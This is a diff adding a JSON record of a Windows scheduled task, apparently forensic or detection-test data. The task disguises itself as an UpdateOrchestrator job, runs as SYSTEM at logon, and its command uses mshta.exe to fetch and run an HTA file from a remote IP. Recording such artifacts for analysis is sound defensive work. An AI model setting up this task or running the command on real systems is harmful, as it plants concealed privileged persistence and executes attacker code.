@@ -1,0 +1,11 @@
+[
+ {
+  "name": "\\Microsoft\\Windows\\UpdateOrchestrator\\BackgroundTask",
+  "command": "mshta.exe http://185.220.101.47/x.hta",
+  "run_as": "SYSTEM",
+  "author": "CORP\\bob",
+  "schedule": "At logon",
+  "status": "Ready",
+  "xml_ctime": "2026-11-03T09:16:00+00:00"
+ }
+]
